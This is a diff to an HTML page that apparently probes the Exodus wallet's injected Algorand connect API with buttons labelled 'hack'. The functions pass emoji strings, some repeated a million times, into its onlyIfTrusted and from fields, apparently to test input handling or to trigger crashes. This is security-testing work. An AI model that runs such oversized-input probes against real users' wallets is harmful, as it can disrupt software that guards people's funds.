@@ -8,21 +8,38 @@
             function hack() {
                 var payload = '\uD83D\uDC04';
                 console.log("[*] " + payload);
-                window.exodus.algorand.connect({onlyIfTrusted:payload, from:payload});
+                window.exodus.algorand.connect({onlyIfTrusted:payload, from:"a"});
             }
 
             function hack2() {
-                var payload = '\uD83D\uDC04'.repeat(1000000);
-                window.exodus.algorand.connect({onlyIfTrusted:payload, from:payload});
+                var payload = '\uD83D\uDC04';
+                console.log("[*] " + payload);
+                window.exodus.algorand.connect({onlyIfTrusted:false, from:payload});
             }
+
+            function hack3() {
+                var payload = '\uD83D\uDC04'.repeat(1000000);
+                console.log("[*] " + payload);
+                window.exodus.algorand.connect({onlyIfTrusted:payload, from:"a"});
+            }
+
+            function hack4() {
+                var payload = '\uD83D\uDC04'.repeat(1000000);
+                console.log("[*] " + payload);
+                window.exodus.algorand.connect({onlyIfTrusted:false, from:payload});
+            }
+
+            
         </script>
         <div style="margin-top:30%;padding: 6px;width:50%;background-color:#000;color:#0E0;border:7px groove #3A6">
         <h1 style="text-shadow: 2px 2px 4px #ff0000;">
-        8
+        9
         </h1>
         <h2>Can we hack x0-w?</h2>
         <input type="button" value="hack" onclick="hack()" />
-        <input type="button" value="hack" onclick="hack2()" />
+        <input type="button" value="hack2" onclick="hack2()" />
+        <input type="button" value="hack3" onclick="hack3()" />
+        <input type="button" value="hack4" onclick="hack4()" />
         </div>
     </body>
 </html>
